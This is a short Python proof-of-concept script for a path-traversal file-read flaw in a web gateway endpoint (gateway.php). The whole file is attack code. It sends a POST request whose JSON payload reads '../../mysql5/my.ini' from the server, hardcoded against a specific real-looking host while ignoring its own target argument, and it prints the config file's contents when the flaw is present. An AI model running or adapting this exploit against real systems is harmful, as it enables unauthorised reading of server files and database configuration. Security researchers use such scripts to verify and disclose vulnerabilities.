#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

def verify(site):
    burp0_url = "http://app.kljy.com.cn:9000/mac/gateway.php"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Content-Type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip"}
    burp0_data = {"json": "{\"url\":\"/general/../../mysql5/my.ini\"}"}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    if "mysqld" in r.text:
        return r.text
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取 my.ini 的文件内容为：", info)
    else:
        print("[-]漏洞不存在")
